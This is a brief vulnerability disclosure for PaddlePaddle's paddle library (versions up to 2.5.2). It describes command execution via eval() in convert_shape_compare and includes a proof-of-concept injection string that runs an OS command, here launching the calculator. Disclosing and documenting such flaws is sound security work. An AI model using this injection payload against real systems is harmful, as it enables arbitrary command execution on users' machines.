
Vulnerability Product: Baidu.Inc PaddlePaddle's paddle  
Vulnerability version: <= 2.5.2  
Vulnerability type: Command Execution  
Vulnerability vender: Baidu.Inc  
Vulnerability Details:  discovered by leeya_bug
Vulnerability location: paddle/jit/dy2static/convert_operators.py  

Baidu.Inc PaddlePaddle's Official lib paddle exists Command Execute Vulnerability, Easy to cause User's devices to be hijacked by attackers.

## [](#header-3)PROVE: 

0、Prepare a computer which could run python and windows10

1、Download Paddle latest version(or <= v2.5.2)  
```
pip3 install paddlepaddle==2.5.2
```

2、Run Python3, Run belowing code in python  
```py
import paddle
paddle.jit.dy2static.convert_operators.convert_shape_compare('prefix','+ str(__import__("os").system("calc")) +','1')
```

3、You can find it successfully run calculator  
![图片](https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/AboutThis1.png)  
proved Command Execution  

POC:  
```py
import paddle
paddle.jit.dy2static.convert_operators.convert_shape_compare('prefix','+ str(__import__("os").system("calc")) +','1')
```

## [](#header-3)REASON: 

An unfiltered dangerous function (line 681) appeared in API function convert_shape_compare of path paddle/jit/dy2static/convert_operators.py, allowing attackers to carefully construct payloads to bypass the filter and result in user's command execution
![图片](https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/AboutThis2.png)  

## [](#header-3)FIX: 

1、do not use eval()
2、filter more

discovered by leeya_bug
